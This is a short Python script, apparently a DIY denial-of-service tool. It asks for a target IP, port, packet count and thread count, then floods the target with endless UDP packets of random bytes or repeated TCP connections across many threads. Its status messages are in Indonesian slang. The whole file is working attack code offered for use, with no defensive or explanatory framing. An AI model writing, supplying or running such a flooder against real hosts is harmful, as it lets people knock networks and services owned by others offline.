#!/usr/bin/env python3
#ZAXH4YOU
import random
import socket
import threading
import os

os.system("clear")

ip = str(input(" IP TARGET : "))
port = int(input(" PORT TARGET : "))
choice = str(input(" ATTACK ? (y/n) : "))
times = int(input(" PACKETS : "))
threads = int(input(" THREADS : "))
def run():
	data = random._urandom(1024)
	i = random.choice(("(ZAXH?)"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" [X]NGOFI BANG PAKETNYA UDH SAMPE TUH")
		except:
			print(" [X]NGOFI BANG PAKETNYA UDH SAMPE TUH")

def run2():
	data = random._urandom(16)
	i = random.choice(("[POK!!]","[POK!!]","[POK!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" [X]NGOFI BANG PAKETNYA UDH SAMPE TUH")
		except:
			s.close()
			print(" [X]NGOFI BANG PAKETNYA UDH SAMPE TUH")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()